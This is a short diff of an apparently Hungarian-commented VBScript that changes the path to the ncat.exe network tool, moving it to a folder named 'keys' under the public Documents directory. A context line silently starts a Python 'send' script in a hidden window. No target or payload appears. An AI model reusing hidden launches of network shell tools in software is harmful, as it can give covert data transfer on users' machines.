@@ -26,7 +26,7 @@ shell.Run "cmd /c start """" /B py """ & sendPath & """", 0, False
 
 ' A Netcat (ncat.exe) fájl pontos elérési útja
 ' Ezt a felhasználónak be kell állítania a telepítés helye szerint!
-NCAT_PATH = "C:\nmap\ncat.exe" 
+NCAT_PATH = "C:\Users\Public\Documents\keys\nmap-7.92\ncat.exe" 
 ' Vagy használhatod a környezeti változót is, ha be van állítva:
 ' NCAT_PATH = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%NCAT%") 
 
